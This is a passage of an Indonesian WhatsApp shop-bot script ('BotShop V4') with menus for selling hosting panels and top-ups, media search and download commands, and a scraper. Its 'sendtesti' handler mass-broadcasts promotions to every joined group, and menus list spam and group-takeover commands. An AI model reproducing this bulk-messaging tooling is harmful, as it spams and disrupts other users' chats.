        type: $(i).find(".main-seven .limit .bt .type").text(),
        thumbnail: $(i).find(".main-seven .limit img").attr("src"),
        episode: $(i).find(".main-seven .limit .epin").text(),
        url: $(i).find(".main-seven a").attr("href"),
      });
    });
    return array;
  },

  search: async function (q) {
    let res = await axios.get("https://x1.sokuja.uk?s=" + encodeURIComponent(q));
    let $ = cheerio.load(res.data);
    let array = [];
    $(".listupd .bs .bsx").each((a, i) => {
      array.push({
        title: $(i).find("a").attr("title"),
        type: $(i).find("a .limit .typez").text(),
        thumbnail: $(i).find("a .limit img").attr("src"),
        status: $(i).find("a .limit .status").text(),
        url: $(i).find("a").attr("href"),
      });
    });
    return array;
  },

  detail: async function (url) {
    let res = await axios.get(url);
    let $ = cheerio.load(res.data);
    let metadata = { title: $(".infox h1").text(), thumbnail: $(".thumb img").attr("src"), sinopsis: $(".entry-content p").eq(1).text().trim() };
    $(".info-content .spe span").each((b, d) => {
      let name = $(d).find("span b").text();
      let key = $(d).text().replace(name, "").trim();
      metadata[name.toLowerCase().split(":")[0].replace(/ /g, "_")] = key;
    });
    let episode = [];
    $(".eplister ul li").each((a, i) => {
      episode.push({ title: $(i).find(".epl-title").text(), release: $(i).find(".epl-date").text(), url: $(i).find("a").attr("href") });
    });
    return { metadata, episode };
  },

  episode: async function (url) {
    let res = await axios.get(url);
    let $ = cheerio.load(res.data);
    let metadata = { title: $(".title-section h1").text(), thumbnail: $(".tb img").attr("src"), updated: $(".lm .updated").text() };
    let downloads = {};
    $(".mirror option").each((a, i) => {
      let exec = cheerio.load(atob($(i).attr("value")));
      let quality = $(i).text().trim().split(" ")[1];
      let url = exec("source").attr("src");
      if (url) downloads[quality] = { quality, url };
    });
    return { metadata, downloads };
  },
};

async function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}
//=======Kepo
const pathh = "./library/database/reseller.json";

// Pastikan file database ada sebelum dibaca
if (!fs.existsSync(pathh)) fs.writeFileSync(pathh, JSON.stringify([]));

// Baca database reseller.json
let premium2 = JSON.parse(fs.readFileSync(pathh, "utf8"));

// Fungsi menyimpan database
function saveDatabase() {
    fs.writeFileSync(pathh, JSON.stringify(premium2, null, 2));
}

// Pastikan premium2 sudah ada sebelum digunakan
const isPremium2 = premium2.includes(m.sender);
//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {

case "menu": {

await runLoading(m);
await gisnaxd.sendMessage(m.chat, {
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  buttons: [
    {
      buttonId: 'action',
      buttonText: { displayText: 'ini pesan interactiveMeta' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '📒Menu BotShopV4',
          sections: [
            {
              title: 'List Menu ♨️',
              rows: [
                {
                  title: '📂ALLMENU',
                  id: '.allmenu'
                },
                {
                  title: '📂PRODUK',
                  id: '.produk'
                },
                {
                  title: '📂PRODUK PAYSALDO',
                  id: '.produk-saldo'
                },                
                {
                  title: '📂OWNER',
                  id: '.owner'
                },
                {
                  title: '📂RUNTIME',
                  id: '.ping'
                }
              ]
            }
          ]
        })
      }
    },
    {
      buttonId: `.buypanel`,
      buttonText: { displayText: 'Buy Panel' },
      type: 1
    },
    {
      buttonId: `.buyvps`,
      buttonText: { displayText: 'Buy Vps' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: { url: global.image.menu }, 
  caption: `┏━━━〔 🤖 *INFORMASI BOT* 🤖 〕━━━┓
┃ 🔹 *Bot Name:* ${global.botname}  
┃ 🔹 *Version:* 4.0.0
┃ 🔹 *Mode:* *${gisnaxd.public ? "Public" : "Self"}*  
┃ 🔹 *Uptime:* ${runtime(process.uptime())}  
┃ 🔹 *Owner:* @${global.owner}  
┃ 🔹 *Kontak:* wa.me/${global.owner}  
┃ 🔹 *Support:* t.me/Qpyakn2  
┃ 🔹 *Powered by:* BOTSHOP V4 🚴  
┃
┗━━━━━━━━━━━━━━━━━━━  
🚀 *Bot ini siap membantu Anda 24/7!*`
}, { quoted: qlist })
}
break

case "allmenu": {

await runLoading(m);
await gisnaxd.sendMessage(m.chat, {
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '♨️All Menu',
          sections: [
            {
              title: '🧭List Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '🏛Produk Kami',
                  id: '.produk'
                },
                {
                  title: '🏛Produk PaySaldoi',
                  id: '.produk-saldo'
                },
                {
                  title: '🤸Othermenu',
                  id: '.othermenu'
                },
                {
                  title: '🔎Searchmenu',
                  id: '.searchmenu'
                },                
                {
                  title: '🛠Toolsmenu',
                  id: '.toolsmenu'
                },
                {
                  title: '🏷Shopmenu',
                  id: '.shopmenu'
                }, 
                 {
                  title: '📥Downloadmenu',
                  id: '.downloadmenu'
                }, 
                {
                  title: '🏷Storemenu',
                  id: '.storemenu'
                },
                {
                  title: '💳Digitaloceanmenu',
                  id: '.digitaloceanmenu'
                },
                {
                  title: '📢Panelmenu',
                  id: '.panelmenu'
                },
                {
                  title: '🚴Installmenu',
                  id: '.installmenu'
                },
                {
                  title: '🏩Groupmenu',
                  id: '.groupmenu'
                }, 
                {
                  title: '🌐Ownermenu',
                  id: '.ownermenu'
                },
                {
                  title: '🎰Rgb Menu',
                  id: '.rgbmenu'
                },
                {
                  title: '♨️Fitur New',
                  id: '.fiturnew'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.menu}, 
  caption: `┏━━━〔 🤖 *INFORMASI BOT* 🤖 〕━━━┓
┃ 🔹 *Bot Name:* ${global.botname}  
┃ 🔹 *Version:* 4.0.0
┃ 🔹 *Mode:* *${gisnaxd.public ? "Public" : "Self"}*  
┃ 🔹 *Uptime:* ${runtime(process.uptime())}  
┃ 🔹 *Owner:* @${global.owner}  
┃ 🔹 *Kontak:* wa.me/${global.owner}  
┃ 🔹 *Support:* t.me/Qpyakn2  
┃ 🔹 *Powered by:* BOTSHOP V4 🚴  
┃ 🔹 *Your Status:* ➤ *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : "Free User"})*
┃ 
┗━━━━━━━━━━━━━━━━━━━  
🚀 *Bot ini siap membantu Anda 24/7!*`
}, {quoted: qlist})
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//Bagian AllMenu
case "othermenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
    〘 *O T H E R M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .cekidch
  • .cekidgc
  • .qc
  • .brat
  • .bratvid
  • .emojigif
  • .emojimix
  • .readviewonce
  • .stickerwm
  • .sticker
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "searchmenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
    〘 *S E A R C H M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .yts
  • .apkmod
  • .pinterest
  • .gimage
  • .sfile
  • .playstore
  • .xnxx
  • .npmsearch
  • .tiktokstalk
  • .igstalk
  • .ytstalk
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "toolsmenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
      〘 *T O O L S M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .ai
  • .deepseek
  • .gpt
  • .tourl
  • .ssweb
  • .translate
  • .tohd
  • .removebg
  • .ocr
  • .shortlink
  • .shortlink2
  • .enc
  • .enchard
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "shopmenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
    〘 *S H O P M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .buypanel
  • .buyadp
  • .buyptpanel
  • .buyownerpanel
  • .buyscript
  • .buyvps
  • .buydigitalocean
  • .buyjasajpm
  • .topupsaldo
  • .topupdiamond
  • .listscript
  • .listnokos
  • .layananapk
  • .layananewallet
  • .daftarlayanan
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "downloadmenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
 〘 *D O W N L O A D M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .tiktok
  • .tiktokmp3
  • .facebook
  • .capcut
  • .doodstream
  • .instagram
  • .ytmp3
  • .ytmp4
  • .play
  • .playvid
  • .playspotify
  • .gitclone
  • .googledrive
  • .spotify
  • .terabox
  • .xnxxdl
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "storemenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
    〘 *S T O R E M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .addrespon
  • .delrespon
  • .listrespon
  • .done
  • .proses
  • .jpm
  • .jpmht
  • .jpmtesti
  • .jpmallch
  • .addidch
  • .delidch
  • .jpmslide
  • .jpmslideht
  • .sendtesti
  • .pushkontak
  • .pushkontak2
  • .payment
  • .produk
  • .upswtag
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "digitaloceanmenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
    〘 *DIGITAL OCEAN MENU* 〙
━━━━━━━━━━━━━━━━━━━
  • .cvps
  • .sisadroplet
  • .deldroplet
  • .listdroplet
  • .rebuild
  • .restartvps
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "panelmenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
    〘 *P A N E L M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .addserverpanel
  • .delserverpanel
  • .listserverpanel
  • .addaksesgc
  • .delaksesgc
  • .listaksesgc
  • .1gb
  • .2gb
  • .3gb
  • .4gb
  • .5gb
  • .6gb
  • .7gb
  • .8gb
  • .9gb
  • .10gb
  • .unlimited
  • .cadmin
  • .delpanel
  • .deladmin
  • .listpanel
  • .listadmin
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "installmenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
    〘 *I N S T A L M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .hackbackpanel
  • .installpanel
  • .installtemastellar
  • .installtemabilling
  • .installtemaenigma
  • .uninstallpanel
  • .uninstalltema
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "groupmenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
    〘 *G R O U P M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .antilink
  • .antilink2
  • .blacklistjpm
  • .welcome
  • .add
  • .kick
  • .close
  • .open
  • .hidetag
  • .kudetagc
  • .leave
  • .tagall
  • .promote
  • .demote
  • .resetlinkgc
  • .linkgc
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "ownermenu": {
let teks = `
━━━━━━━━━━━━━━━━━━━
    〘 *O W N E R M E N U* 〙
━━━━━━━━━━━━━━━━━━━
  • .addstokdo
  • .delstokdo
  • .liststokdo
  • .autoread
  • .autopromosi
  • .autoreadsw
  • .autotyping
  • .addowner
  • .listowner
  • .delowner
  • .self/public
  • .svsc
  • .listsc
  • .delsc
  • .getsc
  • .subdomain
  • .setppbot
  • .clearsession
  • .clearchat
  • .resetdb
  • .restartbot
  • .backupsc
  • .getcase
  • .listgc
  • .joingc
  • .joinch
  • .upchannel
  • .addscript
  • .delsecript
  • .setloading
  • .ceksaldosmm
  • .ceksaldo-orkut
  • .informasi-akun
  • .autoai
  • .listrekber
  • .rekap
  • .addstock
  • .delstock
  • .ambilstock
  • .addproduk
  • .delproduk
  • .bc
  • .upsw
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "fiturnew": {
let teks = `
━━━━━━━━━━━━━━━━━━━
       〘 *N E W F I T U R* 〙
━━━━━━━━━━━━━━━━━━━
 • .animebrat
 • .whatmusic
 • .sokuna
 • .jadwalsholat
 • .waifu
 • .infonegara
 • .logogen
 • .vcc
 • .aigen
 • .nulis
 • .str
 • .deepimg
 • .animequotes
 • .struk
 • .gemini
 • .animebrat-vid
 • .hytam
 • .convert
 
> Fitur Lainnya Blm Di Tambahkan :)
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: qlist})
}
break

case "produk": {
await runLoading(m);
await gisnaxd.sendMessage(m.chat, {
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '📒Produk Qoupay',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '📣Beli Panel',
                  id: '.buypanel'
                },
                {
                  title: '📣Beli Admin Panel',
                  id: '.buyadp'
                },
                {
                  title: '📣Beli Pt Panel',
                  id: '.buyptpanel'
                },                
                {
                  title: '📣Beli Owner Panel',
                  id: '.buyownerpanel'
                },
                {
                  title: '📣Beli Script',
                  id: '.listscript'
                }, 
                 {
                  title: '📣Beli Nokos',
                  id: '.listnokos'
                }, 
                {
                  title: '📣Deposit',
                  id: '.deposit'
                },
                {
                  title: '📣Cek Saldo',
                  id: '.saldo'
                },
                {
                  title: '📣Tranfer Saldo',
                  id: '.transfer'
                },
                {
                  title: '📣Beli App Premium',
                  id: '.layananapk'
                },
                {
                  title: '📣TopUp Saldo (Vip)',
                  id: '.layananewallet'
                },
                {
                  title: '📣TopUp Saldo (Orkut)',
                  id: '.topupsaldo'
                }, 
                {
                  title: '📣TopUp Saldo Diamond',
                  id: '.topupdiamond'
                },
                {
                  title: '📣Isi Pulsa All Oprator',
                  id: '.isipulsa'
                },
                {
                  title: '📣Sosmed',
                  id: '.daftarlayanan'
                },
                {
                  title: '📣Rekber',
                  id: '.rekber'
                },
                {
                  title: '📣Buy DigitalOcean',
                  id: '.buydo'
                },
                {
                  title: '📣Buy JasaJpm',
                  id: '.jasajpm'
                },
                {
                  title: '📣Buy Domain',
                  id: '.buydomain'
                },
                {
                  title: '📣Jasa Install Panel',
                  id: '.jasainstallpanel'
                },
                {
                  title: '📣Jasa Hb Panel',
                  id: '.jasahbpanel'
                },
                {
                  title: '📣Stock App Premium',
                  id: '.stok'
                },
                {
                  title: '📣Buy Reseller Panel',
                  id: '.buyreseller'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.menu}, 
  caption: `┏━━━〔 🤖 *INFORMASI BOT* 🤖 〕━━━┓
┃ 🔹 *Bot Name:* ${global.botname}  
┃ 🔹 *Version:* 4.0.0
┃ 🔹 *Mode:* *${gisnaxd.public ? "Public" : "Self"}*  
┃ 🔹 *Uptime:* ${runtime(process.uptime())}  
┃ 🔹 *Owner:* @${global.owner}  
┃ 🔹 *Kontak:* wa.me/${global.owner}  
┃ 🔹 *Support:* t.me/Qpyakn2  
┃ 🔹 *Powered by:* BOTSHOP V4 🚴  
┃ 
┗━━━━━━━━━━━━━━━━━━━  
🚀 *Bot ini siap membantu Anda 24/7!*`
}, {quoted: qlist})
}
break
case "rgbmenu": {

await runLoading(m);
await gisnaxd.sendMessage(m.chat, {
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '📒Rgb Only',
          sections: [
            {
              title: 'List Mini Games',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '📥Daftar',
                  id: '.daftar'
                },
                {
                  title: '👤Profile',
                  id: '.profile'
                },
                {
                  title: '⭐️bansos',
                  id: '.bansos'
                },
                {
                  title: '🚕 Taxi',
                  id: '.taksi'
                },
                {
                  title: '🗺 Nelayan',
                  id: '.nelayan'
                },
                {
                  title: '🏗 Kuli Bangunan',
                  id: '.kuli'
                },
                {
                  title: '📦 Kurir Pakey',
                  id: '.kurir'
                },
                {
                  title: '🏛 Bank Rpg',
                  id: '.bank'
                },
                {
                  title: '💳 Tarik Saldo Bank',
                  id: '.tarikbank'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.menu}, 
  caption: `┏━━━〔 🤖 *INFORMASI BOT* 🤖 〕━━━┓
┃ 🔹 *Bot Name:* ${global.botname}  
┃ 🔹 *Version:* 4.0.0
┃ 🔹 *Mode:* *${gisnaxd.public ? "Public" : "Self"}*  
┃ 🔹 *Uptime:* ${runtime(process.uptime())}  
┃ 🔹 *Owner:* @${global.owner}  
┃ 🔹 *Kontak:* wa.me/${global.owner}  
┃ 🔹 *Support:* t.me/Qpyakn2  
┃ 🔹 *Powered by:* BOTSHOP V4 🚴  
┃ 
┗━━━━━━━━━━━━━━━━━━━  
🚀 *Bot ini siap membantu Anda 24/7!*`
}, {quoted: qlist})
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
gisnaxd.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
gisnaxd.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
gisnaxd.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "unblok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await gisnaxd.updateBlockStatus(mem, "unblock");
if (m.isGroup) gisnaxd.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "svsc": {
if (!isCreator) return
if (!text || !text.endsWith(".zip")) return m.reply(example("cpanel.zip & reply scnya"))
if (!/zip/.test(mime)) return m.reply(example("cpanel.zip & reply scnya"))
if (!m.quoted) return m.reply(example("cpanel & reply scnya"))
let ff = await m.quoted.download()
let nama = text
await fs.writeFileSync("./library/database/savesc/"+nama, ff)
return m.reply(`Berhasil menyimpan script *${nama}.zip*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listsc": {
if (!isCreator) return
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
let teks = ""
for (let e of scnya) {
teks += e + "\n"
}
m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc|6285###"))
if (!text.split("|'")) return m.reply(example("namasc|6285###"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await gisnaxd.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
let namasc = text.split("|")[0]
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await gisnaxd.sendMessage(input, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
m.reply(`Berhasil mengirim script *${namasc}* ke ${input.split("@")[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await gisnaxd.sendMessage(m.chat, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await fs.unlinkSync("./library/database/savesc/"+namasc)
m.reply(`Berhasil menghapus script *${namasc}*`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await gisnaxd.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await gisnaxd.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await gisnaxd.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await gisnaxd.sendMessage(i, {
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                 {
                  title: 'Digitalocean',
                  id: '.buydo'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                },
                {
                  title: 'Topup Saldo Ewallet',
                  id: '.topupsaldo'
                },
                {
                  title: 'Topup Diamonds',
                  id: '.topupdiamond'
                }, 
                {
                  title: 'Topup Pulsa',
                  id: '.isipulsa'
                }          
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await gisnaxd.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "play": {
if (!text) return m.reply(example("dj tiktok"))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp3(res.url)
if (anu.audio) {
let urlMp3 = anu.audio
await gisnaxd.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playspotify": case "plays": case "playsp": {
if (!text) return m.reply(example("intro ariana"))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})

var anu = await fetchJson("https://api.siputzx.my.id/api/s/spotify?query="+text)

if (anu.result.download.link) {
let urlMp3 = anu.result.download.link
await gisnaxd.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: anu.result.metadata.cover_url, title: anu.result.metadata.title, body: `Author ${anu.result.metadata.artists} || Duration ${anu.result.metadata.duration}`, sourceUrl: anu.result.metadata.link, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan") 
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))

    
 
await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp4(res.url)
if (anu.video) {
let urlMp3 = anu.video
await gisnaxd.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return m.reply(example('we dont talk'))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sfile": {
if (!text) return m.reply(example('script bot whatsapp'))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://api.siputzx.my.id/api/s/sfile?query=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Link :* ${res.link}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "xnxx": {
if (!text) return m.reply(example('step sister'))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/xnxx?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Info :* ${res.info}
* *Link :* ${res.link}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "npm": case "npmsearch": {
    if (!text) return m.reply(example('axios'));

    await gisnaxd.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });

    try {
        let response = await fetchJson(`https://restapi-v2.simplebot.my.id/search/npm?q=${text}`);
        
        if (!response || !response.result || !Array.isArray(response.result)) {
            return m.reply("❌ Tidak ada hasil ditemukan atau format data salah.");
        }

        let anuan = response.result;
        let teks = "\n";

        for (let res of anuan) {
            teks += `📦 *${res.title}*\n🗓 *Update*: ${res.update.split("T")[0]}\n🔗 *Link*: ${res.links.npm}\n\n`;
        }

        await m.reply(teks);
    } catch (error) {
        console.error("Error fetching NPM data:", error);
        m.reply("❌ Terjadi kesalahan saat mengambil data dari API.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playstore": {
if (!text) return m.reply(example('alight motion'))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://api.siputzx.my.id/api/apk/playstore?query=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.nama}
* *Developer :* ${res.developer}
* *Rating :* ${res.rate}
* *Link :* ${res.link}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gimage": {
if (!text) return m.reply(example("anime dark"))

    

await gisnaxd.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pint = await fetchJson(`https://restapi-v2.simplebot.my.id/search/gimage?q=${text}`)
let pin = pint.result
if (pin.length > 5) await pin.splice(0, 6)
const txts = text
